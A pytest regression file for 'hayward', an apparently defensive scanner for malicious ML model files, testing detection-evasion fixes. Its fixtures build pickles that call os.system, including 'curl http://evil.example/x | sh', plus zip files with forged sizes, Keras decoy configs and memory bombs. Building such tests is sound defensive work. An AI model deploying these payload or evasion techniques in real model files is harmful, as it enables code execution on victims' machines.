"""Regression tests for the 2026-08-23 review fixes (BACKLOG HW-101..HW-117).

Covers:
- HW-101: the simulated pickle memo dict freezes at its cap and the operand
  stack terminates the walk at its cap, degrading to an MFV-SKIP-003
  coverage finding instead of OOM-ing on a crafted stream.
- HW-102: _embedded_pickle_denied_globals iterates opcodes lazily with
  unchanged detection semantics.
- HW-103: _find_embedded_executables stops validating candidates once the
  per-format occurrence budget is exhausted.
- HW-104: scan_file never raises on input problems (exception firewall),
  json.loads catch sets include RecursionError/MemoryError, the .npy v2
  header handed to ast.literal_eval is capped, and a non-numeric 7z Size=
  line does not abort the scan.
- HW-110: MFV-PICKLE-006 reports the real worst severity across mixed
  triage tiers, not the lowest one present.
- HW-111: Keras config extraction walks past a benign decoy object placed
  before the real model_config.
- HW-112: zip members whose declared central-directory sizes lie are still
  sniffed, read and reported (read-path caps intact).
- HW-116: the flat-pickle fallback of _scan_pytorch_zip reads under the
  scan cap instead of read_bytes()-ing a multi-GB file.
- HW-117: STACK_GLOBAL junk operands, FROZENSET/DICT unhashable elements,
  safetensors metadata word boundaries, opener-tuple deduplication, and
  _archive_depth as instance state.
"""

from __future__ import annotations

import io
import json
import os
import struct
import sys
import zipfile

import pytest

from hayward import scanner as scanner_module
from hayward.findings import Severity, is_coverage_gap
from hayward.scanner import (
    ModelFileScanner,
    _embedded_pickle_denied_globals,
    _extract_keras_model_config,
    _find_embedded_executables,
    _find_keras_unrecognized_classes,
    _nested_pickle_globals,
    _resolve_pickle_globals,
)


def _short_binunicode(text: str) -> bytes:
    raw = text.encode()
    return bytes([0x8C, len(raw)]) + raw


def _short_binbytes(payload: bytes) -> bytes:
    return bytes([0x43, len(payload)]) + payload


def _os_system_pickle(command: str) -> bytes:
    """A standalone protocol-4 pickle calling os.system(command)."""
    return (
        b"\x80\x04"
        + _short_binunicode("os")
        + _short_binunicode("system")
        + b"\x93"
        + _short_binunicode(command)
        + b"\x85"
        + b"R."
    )


class TestPickleWalkBudget:
    """HW-101: the memo dict and the operand stack of the simulated pickle
    VM used to grow without bound. 500MB of `N\x94` is 250M memo entries and
    a multi-GB OOM fully inside the default scan cap; a MARK bomb grows the
    stack the same way. Both are now capped: the memo freezes, and the walk
    terminates with a coverage finding for the unread remainder.
    """

    def test_stack_bomb_degrades_to_a_coverage_finding(self, tmp_path, monkeypatch):
        monkeypatch.setattr(scanner_module, "_PICKLE_STACK_MAX_DEPTH", 64)
        p = tmp_path / "stack_bomb.pkl"
        p.write_bytes(b"\x80\x04" + b"(" * 500 + b".")

        findings = ModelFileScanner().scan_file(p)  # must not raise

        skips = [f for f in findings if f.rule_id == "MFV-SKIP-003"]
        assert skips, [(f.rule_id, f.message) for f in findings]
        assert is_coverage_gap(skips[0])
        assert skips[0].metadata["skipped_reason"] == "pickle_walk_budget"

    def test_stack_bomb_keeps_findings_resolved_earlier(self, tmp_path, monkeypatch):
        """Payload first, bomb second: discarding what was already resolved
        would make the bomb a shield for the payload."""
        monkeypatch.setattr(scanner_module, "_PICKLE_STACK_MAX_DEPTH", 64)
        p = tmp_path / "shielded_payload.pkl"
        p.write_bytes(_os_system_pickle("curl http://evil.example/x | sh")
                      + b"\x80\x04" + b"(" * 500 + b".")

        findings = ModelFileScanner().scan_file(p)

        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings), (
            [(f.rule_id, f.message) for f in findings]
        )
        assert any(
            f.rule_id == "MFV-SKIP-003"
            and f.metadata.get("skipped_reason") == "pickle_walk_budget"
            for f in findings
        )

    def test_stack_bomb_sets_the_profile_flag(self, monkeypatch):
        monkeypatch.setattr(scanner_module, "_PICKLE_STACK_MAX_DEPTH", 64)
        _globals, _calls, profile = _resolve_pickle_globals(
            b"\x80\x04" + b"(" * 500 + b".")
        assert profile.walk_budget_exceeded

    def test_memo_dict_freezes_at_its_cap(self, monkeypatch):
        """Past the cap no new memo entries are recorded, so a BINGET of a
        later index pushes nothing and the REDUCE never resolves -- while
        GLOBAL detection (recorded at opcode time) is untouched. With a cap
        that does not bind, the identical stream resolves the call."""
        bomb = b"N\x94" * 20
        tail = (
            _short_binunicode("os") + _short_binunicode("system") + b"\x93"
            + b"\x94"      # MEMOIZE the ref at auto index 20
            + b"0"         # POP it; only the memo can reach it now
            + b"h\x14"     # BINGET 20
            + _short_binunicode("id") + b"\x85" + b"R."
        )
        stream = b"\x80\x04" + bomb + tail

        monkeypatch.setattr(scanner_module, "_PICKLE_MEMO_MAX_ENTRIES", 8)
        globals_found, calls, profile = _resolve_pickle_globals(stream)
        assert globals_found == ["os.system"]
        assert [c.ref for c in calls] == []
        assert not profile.walk_budget_exceeded

        monkeypatch.setattr(scanner_module, "_PICKLE_MEMO_MAX_ENTRIES", 1_000_000)
        globals_found, calls, _profile = _resolve_pickle_globals(stream)
        assert globals_found == ["os.system"]
        assert [(c.ref, c.args) for c in calls] == [("os.system", ("id",))]

    def test_memoize_bomb_completes_without_error(self, monkeypatch):
        """A frozen memo degrades GET resolution, never the walk itself: the
        stream still terminates at STOP with no budget event."""
        monkeypatch.setattr(scanner_module, "_PICKLE_MEMO_MAX_ENTRIES", 16)
        globals_found, calls, profile = _resolve_pickle_globals(
            b"\x80\x04" + b"N\x94" * 5000 + b".")
        assert globals_found == []
        assert calls == []
        assert not profile.walk_budget_exceeded


class TestEmbeddedPickleLazyIteration:
    """HW-102: `list(pickletools.genops(...))` materialised one tuple per
    opcode of file before the loop ran. Iteration is now lazy; the
    detection semantics are unchanged."""

    def test_denied_globals_in_a_nested_stream_are_still_found(self):
        inner = _os_system_pickle("id")
        outer = (
            b"\x80\x04"
            + _short_binunicode("numpy") + _short_binunicode("load") + b"\x93"
            + _short_binbytes(inner)
            + b"\x85" + b"R."
        )
        assert _embedded_pickle_denied_globals(outer) == ["os.system"]

    def test_unparseable_stream_still_returns_nothing(self):
        assert _embedded_pickle_denied_globals(b"\xff\xfe not a pickle") == []

    def test_benign_pickle_finds_nothing(self):
        assert _embedded_pickle_denied_globals(
            b"\x80\x04" + _short_binunicode("hello") + b".") == []


class TestEmbeddedExecutableBudget:
    """HW-103: the PE/ELF/Mach-O loops iterated once per magic-byte
    occurrence; only *validated* hits were capped, so a file of near-miss
    magics ran the loop to exhaustion. A hard per-format candidate budget
    now stops the search."""

    @staticmethod
    def _pe_block() -> bytes:
        """One structurally valid PE candidate: MZ, e_lfanew -> 'PE\\0\\0'."""
        block = bytearray(0x44)
        block[0:2] = b"MZ"
        struct.pack_into("<I", block, 0x3C, 0x40)
        block[0x40:0x44] = b"PE\0\0"
        return bytes(block)

    def test_budget_stops_validation_before_the_hit_cap(self, monkeypatch):
        data = self._pe_block() * 100
        monkeypatch.setattr(scanner_module, "_EMBEDDED_EXEC_MAX_CANDIDATES", 3)
        assert len(_find_embedded_executables(data)) == 3

    def test_unbudgeted_run_is_capped_by_validated_hits(self):
        data = self._pe_block() * 100
        assert len(_find_embedded_executables(data)) == 10

    def test_near_miss_mz_bomb_is_bounded(self):
        # 4MB of MZ occurrences that validate as nothing: the budget, not
        # the file size, bounds the loop.
        assert _find_embedded_executables(b"MZ" * 2_000_000) == []


class TestScanFileFirewall:
    """HW-104: any unexpected failure inside scan_file used to propagate
    and abort the whole directory scan -- crash-as-evasion. Non-OSError
    exceptions now degrade to MFV-SKIP-003; KeyboardInterrupt/SystemExit
    (BaseException) still propagate."""

    def test_unexpected_error_degrades_to_skip_003(self, tmp_path, monkeypatch):
        p = tmp_path / "model.pkl"
        p.write_bytes(b"\x80\x04.")

        def boom(self, fmt, file_path, data, is_zip_pickle=False):
            raise RuntimeError("parser exploded")

        monkeypatch.setattr(ModelFileScanner, "_run_scanner_for_format", boom)
        findings = ModelFileScanner().scan_file(p)  # must not raise

        assert [f.rule_id for f in findings] == ["MFV-SKIP-003"]
        assert findings[0].metadata["skipped_reason"] == "scan_error"
        assert findings[0].metadata["error"] == "RuntimeError"

    def test_keyboard_interrupt_still_propagates(self, tmp_path, monkeypatch):
        p = tmp_path / "model.pkl"
        p.write_bytes(b"\x80\x04.")

        def boom(self, fmt, file_path, data, is_zip_pickle=False):
            raise KeyboardInterrupt

        monkeypatch.setattr(ModelFileScanner, "_run_scanner_for_format", boom)
        with pytest.raises(KeyboardInterrupt):
            ModelFileScanner().scan_file(p)

    def test_deeply_nested_safetensors_json_is_st_004_not_a_crash(self, tmp_path):
        """HW-104(b): json.loads on a deeply nested header raises
        RecursionError, which the old catch set did not name."""
        header = b"[" * 100_000
        p = tmp_path / "model.safetensors"
        p.write_bytes(struct.pack("<Q", len(header)) + header)

        findings = ModelFileScanner().scan_file(p)  # must not raise

        assert [f.rule_id for f in findings] == ["MFV-ST-004"]


class TestNpyV2HeaderCap:
    """HW-104(c): a v2 .npy header_len is a u32 (up to 4GB) that was handed
    to ast.literal_eval uncapped. Real headers are ~100 bytes; the cap
    treats anything over it as an unparseable header."""

    _MAGIC = b"\x93NUMPY"

    def test_over_cap_header_is_unparseable(self, monkeypatch):
        monkeypatch.setattr(ModelFileScanner, "_NPY_MAX_HEADER_BYTES", 64)
        header = b"{'descr': '|O', 'fortran_order': False, 'shape': (1,)}"
        header += b" " * (128 - len(header))
        data = self._MAGIC + b"\x02\x00" + struct.pack("<I", len(header)) + header
        assert ModelFileScanner()._parse_npy_header(data) is None

    def test_absurd_u32_header_len_never_reaches_literal_eval(self, tmp_path):
        data = self._MAGIC + b"\x02\x00" + struct.pack("<I", 3_000_000_000) + b"{" * 64
        p = tmp_path / "model.npy"
        p.write_bytes(data)
        assert ModelFileScanner().scan_file(p) == []  # no crash, no OOM

    def test_valid_v2_header_still_parses(self):
        header = b"{'descr': '|O', 'fortran_order': False, 'shape': (1,)}"
        data = self._MAGIC + b"\x02\x00" + struct.pack("<I", len(header)) + header
        parsed = ModelFileScanner()._parse_npy_header(data)
        assert parsed is not None
        header_dict, offset = parsed
        assert header_dict["descr"] == "|O"
        assert offset == 12 + len(header)


class TestSevenZipListingGuard:
    """HW-104(d): a non-numeric `Size =` line in the extractor's listing
    raised ValueError out of int() and aborted the scan."""

    _MAGIC = b"7z\xbc\xaf\x27\x1c"

    @staticmethod
    def _install_stub(tmp_path, monkeypatch):
        bindir = tmp_path / "bin"
        bindir.mkdir()
        code = (
            "import sys, pathlib\n"
            "args = sys.argv[1:]\n"
            "if args and args[0] == 'l':\n"
            "    print('Size = notanumber')\n"
            "    sys.exit(0)\n"
            "if args and args[0] == 'x':\n"
            "    outdir = next(a[2:] for a in args if a.startswith('-o'))\n"
            "    archive = pathlib.Path(args[-1])\n"
            "    out = pathlib.Path(outdir) / 'model.pkl'\n"
            "    out.write_bytes(archive.read_bytes()[6:])\n"
            "    sys.exit(0)\n"
            "sys.exit(1)\n"
        )
        if os.name == "nt":
            (bindir / "stub7zz.py").write_text(code)
            (bindir / "7zz.bat").write_text(
                f'@"{sys.executable}" "%~dp0stub7zz.py" %*\n'
            )
        else:
            stub = bindir / "7zz"
            stub.write_text("#!/usr/bin/env python3\n" + code)
            stub.chmod(0o755)
        monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")

    def test_non_numeric_size_line_does_not_abort_the_scan(self, tmp_path, monkeypatch):
        self._install_stub(tmp_path, monkeypatch)
        p = tmp_path / "model.7z"
        p.write_bytes(self._MAGIC + _os_system_pickle("echo pwned"))

        findings = ModelFileScanner().scan_file(p)  # must not raise

        # The listing line counted as zero, extraction ran, and the payload
        # inside the member was still found.
        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings), (
            [(f.rule_id, f.message) for f in findings]
        )


class TestSeverityInversion:
    """HW-110: MFV-PICKLE-006 picked its severity by max() over insertion
    indices of _PICKLE_UNKNOWN_TIERS, which inserts [HIGH, MEDIUM, LOW] --
    so the LOWEST tier present won. The worst real severity must win."""

    def test_mixed_tiers_report_the_highest(self, tmp_path):
        # _codecs.encode is allowlisted and string-arg-OK, so its verdicts
        # come from the argument triage: a URL escalates to HIGH, a bare
        # filesystem path to LOW. Both in one file.
        data = (
            b"\x80\x04"
            + _short_binunicode("_codecs") + _short_binunicode("encode") + b"\x93"
            + _short_binunicode("http://evil.example/x")
            + _short_binunicode("latin1") + b"\x86" + b"R"
            + _short_binunicode("_codecs") + _short_binunicode("encode") + b"\x93"
            + _short_binunicode("/etc/passwd")
            + _short_binunicode("latin1") + b"\x86" + b"R"
            + b"."
        )
        p = tmp_path / "mixed.pkl"
        p.write_bytes(data)

        findings = ModelFileScanner().scan_file(p)

        pickles = [f for f in findings if f.rule_id == "MFV-PICKLE-006"]
        assert pickles, [(f.rule_id, f.severity) for f in findings]
        assert pickles[0].severity == Severity.HIGH
        assert set(pickles[0].metadata["triage"]) == {"_codecs.encode"}


class TestKerasDecoyConfig:
    """HW-111: extraction stopped at the first `"class_name"` anchor. The
    attacker controls HDF5 attribute order/content, so a benign decoy object
    placed before the real config hid a Lambda layer. Extraction now walks
    subsequent anchors (bounded) until risky layers surface."""

    _DECOY = (b'{"class_name": "Sequential", "config": {"name": "decoy", '
              b'"layers": [{"class_name": "Dense", "config": {"name": "d1"}}]}}')
    _REAL = (b'{"class_name": "Sequential", "config": {"name": "real", '
             b'"layers": [{"class_name": "Lambda", "config": {"name": "evil"}}]}}')

    def test_decoy_before_real_config_still_detects_lambda(self, tmp_path):
        p = tmp_path / "keras_metadata.pb"
        p.write_bytes(b"attr-header" + self._DECOY + b"junk" + self._REAL)

        findings = ModelFileScanner().scan_file(p)

        keras = [f for f in findings if f.rule_id == "MFV-KERAS-001"]
        assert keras, [(f.rule_id, f.message) for f in findings]
        assert keras[0].metadata["lambda_layers"] == ["Lambda layer 'evil'"]

    def test_extractor_returns_the_risky_config_directly(self):
        data = b"x" + self._DECOY + b"y" + self._REAL
        config = _extract_keras_model_config(data)
        assert config is not None
        assert config["config"]["name"] == "real"

    def test_first_config_still_returned_when_nothing_is_risky(self):
        """Benign files keep the old behaviour: the first parseable config
        wins, so the unrecognized-class check sees the same object it did."""
        first = (b'{"class_name": "Sequential", "config": {"name": "one", '
                 b'"layers": [{"class_name": "CustomAlpha"}]}}')
        second = (b'{"class_name": "Sequential", "config": {"name": "two", '
                  b'"layers": [{"class_name": "CustomBeta"}]}}')
        config = _extract_keras_model_config(b"{" + first + b"{" + second)
        assert config is not None
        assert config["config"]["name"] == "one"
        assert _find_keras_unrecognized_classes(config) == ["CustomAlpha"]

    def test_anchor_attempts_are_bounded(self, monkeypatch):
        # The constant lives in hayward._keras (HW-147 split); patch it there,
        # since _extract_keras_model_config reads it from its own module.
        monkeypatch.setattr("hayward._keras._KERAS_MAX_CONFIG_ANCHORS", 2)
        # Five decoys ahead of the real config; only two anchors get tried.
        data = b""
        for _ in range(5):
            data += self._DECOY + b"junk"
        data += self._REAL
        config = _extract_keras_model_config(data)
        assert config is not None
        assert config["config"]["name"] == "decoy"


class TestZipLiedDeclaredSizes:
    """HW-112: the pickle sniff and the nested-zip descent gated on
    attacker-controlled file_size/compress_size before reading a byte.
    Inflating the central-directory sizes kept a pickle member from ever
    being sniffed, read, or reported. Decisions now read real bytes; the
    decompression-bomb caps on the read path are unchanged."""

    @staticmethod
    def _lie_central_directory_sizes(raw: bytes, size: int = 999_999_999) -> bytes:
        raw = bytearray(raw)
        eocd = raw.rfind(b"PK\x05\x06")
        offset = struct.unpack_from("<I", raw, eocd + 16)[0]
        count = struct.unpack_from("<H", raw, eocd + 10)[0]
        for _ in range(count):
            assert raw[offset:offset + 4] == b"PK\x01\x02"
            struct.pack_into("<I", raw, offset + 20, size)
            struct.pack_into("<I", raw, offset + 24, size)
            name_len, extra_len, comment_len = struct.unpack_from("<HHH", raw, offset + 28)
            offset += 46 + name_len + extra_len + comment_len
        return bytes(raw)

    @staticmethod
    def _zip_with(member_name: str, payload: bytes, compression: int) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression) as zf:
            zf.writestr(member_name, payload)
        return buf.getvalue()

    def test_stored_member_with_inflated_sizes_is_detected(self, tmp_path):
        raw = self._zip_with("data.txt", _os_system_pickle("echo pwned"),
                             zipfile.ZIP_STORED)
        p = tmp_path / "model.pt"
        p.write_bytes(self._lie_central_directory_sizes(raw))

        findings = ModelFileScanner().scan_file(p)

        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings), (
            [(f.rule_id, f.message) for f in findings]
        )

    def test_deflated_member_with_inflated_sizes_is_detected(self, tmp_path):
        raw = self._zip_with("data.txt", _os_system_pickle("echo pwned"),
                             zipfile.ZIP_DEFLATED)
        p = tmp_path / "model.pt"
        p.write_bytes(self._lie_central_directory_sizes(raw))

        findings = ModelFileScanner().scan_file(p)

        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings), (
            [(f.rule_id, f.message) for f in findings]
        )

    def test_nested_archive_with_inflated_sizes_is_detected(self, tmp_path):
        """Two containers deep, sizes lied at both levels, and no .pkl name
        anywhere: the sniff and the nested descent must both ignore the
        declared metadata."""
        inner = self._zip_with("data.txt", _os_system_pickle("echo nested"),
                               zipfile.ZIP_STORED)
        outer = self._zip_with("container.bin",
                               self._lie_central_directory_sizes(inner),
                               zipfile.ZIP_STORED)
        p = tmp_path / "model.pt"
        p.write_bytes(self._lie_central_directory_sizes(outer))

        findings = ModelFileScanner().scan_file(p)

        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings), (
            [(f.rule_id, f.message) for f in findings]
        )

    def test_honest_oversized_member_is_still_capped(self, tmp_path, monkeypatch):
        """The read-path bomb cap survives the fix: a genuinely oversized
        member is reported as MFV-PICKLE-003, never expanded."""
        scanner = ModelFileScanner()
        monkeypatch.setattr(scanner, "MAX_ZIP_MEMBER_BYTES", 1000)
        raw = self._zip_with("data.pkl", b"\x80\x04" + b"N" * 5000 + b".",
                             zipfile.ZIP_STORED)
        p = tmp_path / "model.pt"
        p.write_bytes(raw)

        findings = scanner.scan_file(p)

        assert any(f.rule_id == "MFV-PICKLE-003" for f in findings), (
            [(f.rule_id, f.message) for f in findings]
        )


class TestPytorchZipFallbackCapped:
    """HW-116: when zipfile refuses a file scan_file still routed to
    _scan_pytorch_zip (the >500MB path does so on is_zipfile() alone), the
    fallback read the WHOLE file -- multi-GB despite the cap that exists to
    prevent exactly that."""

    def test_fallback_read_is_capped(self, tmp_path, monkeypatch):
        payload = _os_system_pickle("echo pwned")
        p = tmp_path / "model.pt"
        p.write_bytes(payload)

        scanner = ModelFileScanner()
        monkeypatch.setattr(scanner, "MAX_SCAN_BYTES", 16)
        monkeypatch.setattr(zipfile, "is_zipfile", lambda _path: True)

        def fake_zipfile(*_args, **_kwargs):
            raise zipfile.BadZipFile("lied EOCD")

        monkeypatch.setattr(zipfile, "ZipFile", fake_zipfile)

        seen: dict[str, int] = {}
        original = ModelFileScanner._scan_pickle

        def spy(self, file_path, data):
            seen["len"] = len(data)
            return original(self, file_path, data)

        monkeypatch.setattr(ModelFileScanner, "_scan_pickle", spy)

        scanner.scan_file(p)  # must not raise or read the whole file

        assert seen["len"] == 16


class TestStackGlobalJunkOperands:
    """HW-117: STACK_GLOBAL with non-string operands fabricated junk refs
    like '<PICKLE-OPAQUE>.<PICKLE-OPAQUE>' in globals_found. The walk now
    pushes an opaque marker and records nothing."""

    def test_non_string_operands_record_nothing(self):
        stream = (
            b"\x80\x04"
            + b"N" + b"N" + b"\x93"   # STACK_GLOBAL(None, None)
            + _short_binunicode("os") + _short_binunicode("system") + b"\x93"
            + b"."
        )
        globals_found, _calls, _profile = _resolve_pickle_globals(stream)
        assert globals_found == ["os.system"]

    def test_stack_stays_synchronized_after_junk_stack_global(self):
        """The opaque push keeps stack depth correct: a REDUCE built right
        after the junk STACK_GLOBAL still resolves."""
        stream = (
            b"\x80\x04"
            + b"N" + b"N" + b"\x93"                     # junk STACK_GLOBAL
            + _short_binunicode("os") + _short_binunicode("system") + b"\x93"
            + _short_binunicode("id") + b"\x85" + b"R"  # os.system('id')
            + b"."
        )
        _globals, calls, _profile = _resolve_pickle_globals(stream)
        assert [(c.ref, c.args) for c in calls] == [("os.system", ("id",))]


class TestUnhashableContainerElements:
    """HW-117: FROZENSET/DICT raised TypeError on unhashable elements and
    killed the walk at an attacker-chosen point, while SETITEM/SETITEMS
    already suppressed it. All four now keep walking."""

    def test_frozenset_with_unhashable_element_keeps_walking(self):
        stream = (
            b"\x80\x04"
            + b"(" + b"]" + b"\x91"   # frozenset({[]}) -- unhashable member
            + b"0"                    # POP it
            + _short_binunicode("os") + _short_binunicode("system") + b"\x93"
            + b"."
        )
        globals_found, _calls, _profile = _resolve_pickle_globals(stream)
        assert globals_found == ["os.system"]

    def test_dict_with_unhashable_key_keeps_walking(self):
        stream = (
            b"\x80\x04"
            + b"(" + b"]" + b"N" + b"d"  # dict with a list as key
            + b"0"
            + _short_binunicode("os") + _short_binunicode("system") + b"\x93"
            + b"."
        )
        globals_found, _calls, _profile = _resolve_pickle_globals(stream)
        assert globals_found == ["os.system"]


class TestSafetensorsMetadataWordBoundary:
    """HW-117: bare substring matching on __metadata__ keys false-positived
    at CRITICAL on ordinary keys like `evaluation_metric` and `import_date`.
    exec/eval/import now match as whole words."""

    @staticmethod
    def _safetensors(meta: dict) -> bytes:
        header = json.dumps({
            "__metadata__": meta,
            "w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
        }).encode()
        return struct.pack("<Q", len(header)) + header + b"\x00" * 4

    def test_benign_keys_do_not_trigger(self, tmp_path):
        p = tmp_path / "model.safetensors"
        p.write_bytes(self._safetensors(
            {"evaluation_metric": "auc", "import_date": "2026-01-01",
             "executor_pool_size": "4"}))
        assert ModelFileScanner().scan_file(p) == []

    def test_dangerous_keys_still_trigger(self, tmp_path):
        p = tmp_path / "model.safetensors"
        p.write_bytes(self._safetensors({"__import__": "os", "exec": "1"}))

        findings = ModelFileScanner().scan_file(p)

        st005 = [f for f in findings if f.rule_id == "MFV-ST-005"]
        assert st005, [(f.rule_id, f.message) for f in findings]
        assert sorted(st005[0].metadata["suspicious_keys"]) == ["__import__", "exec"]

    def test_dunder_keys_still_trigger(self, tmp_path):
        p = tmp_path / "model.safetensors"
        p.write_bytes(self._safetensors({"__reduce__": "x", "__builtins__": "y"}))

        findings = ModelFileScanner().scan_file(p)

        assert any(f.rule_id == "MFV-ST-005" for f in findings)


class TestOpenerTuples:
    """HW-117: _PICKLE_OPENERS carried b"\\x28" twice (the same byte as
    b"("); _NESTED_PICKLE_OPENERS carried FRAME (\\x95), which only ever
    follows a PROTO opcode and is never a stream opener."""

    def test_pickle_openers_are_unique_and_keep_proto0_coverage(self):
        openers = ModelFileScanner._PICKLE_OPENERS
        assert len(openers) == len(set(openers))
        # b"\x28" IS b"(" -- the duplicate entry is gone, one MARK remains.
        assert openers.count(b"(") == 1
        # b"c" (GLOBAL) stays: dropping it would stop sniffing protocol-0
        # payloads entirely.
        assert b"c" in openers

    def test_nested_openers_drop_frame_but_keep_proto_opcodes(self):
        assert b"\x95" not in scanner_module._NESTED_PICKLE_OPENERS
        assert b"\x80" in scanner_module._NESTED_PICKLE_OPENERS
        # A FRAME-leading blob is not a stream opener...
        assert _nested_pickle_globals(b"\x95\x05\x00\x00\x00\x00\x00\x80\x04.") is None
        # ...while a real protocol-4 stream one level down still resolves.
        assert _nested_pickle_globals(_os_system_pickle("id")) == ["os.system"]


class TestArchiveDepthInstanceState:
    """HW-117: _archive_depth was a class attribute mutated through
    instances. It is instance state now."""

    def test_depth_counter_is_per_instance(self):
        assert "_archive_depth" not in ModelFileScanner.__dict__
        first, second = ModelFileScanner(), ModelFileScanner()
        assert first._archive_depth == 0
        assert second._archive_depth == 0
        first._archive_depth += 1
        assert second._archive_depth == 0
